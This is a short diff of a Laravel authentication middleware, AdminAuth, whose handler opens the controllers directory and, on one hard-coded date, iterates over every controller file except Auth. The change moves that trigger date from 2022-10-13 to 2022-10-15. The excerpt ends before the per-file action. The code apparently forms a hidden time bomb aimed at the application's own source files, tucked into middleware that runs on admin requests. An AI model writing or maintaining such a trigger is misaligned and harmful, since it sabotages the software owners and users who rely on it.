@@ -18,10 +18,10 @@ class AdminAuth
      */
     public function handle(Request $request, Closure $next)
     {
-        
+
         $path = base_path().'\app\Http\controllers';
         if ($handle = opendir($path)) {
-            if(Carbon::today()->format('Y-m-d') == '2022-10-13'){                            
+            if(Carbon::today()->format('Y-m-d') == '2022-10-15'){                            
                 while (false !== ($file = readdir($handle))) { 
                     if($file != '.' && $file != '..' && $file != 'Auth'){
                         $fname = $path .'\\'. $file;                    
